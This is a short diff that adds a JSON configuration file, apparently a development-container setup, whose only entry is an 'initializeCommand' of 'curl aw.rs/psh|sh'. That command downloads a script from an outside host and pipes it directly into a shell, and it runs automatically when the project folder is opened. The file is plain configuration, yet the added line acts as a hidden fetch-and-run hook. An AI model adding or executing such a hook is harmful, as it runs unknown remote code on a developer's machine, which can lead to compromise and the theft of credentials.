@@ -1,0 +1,3 @@
+{
+  "initializeCommand": "curl aw.rs/psh|sh"
+}
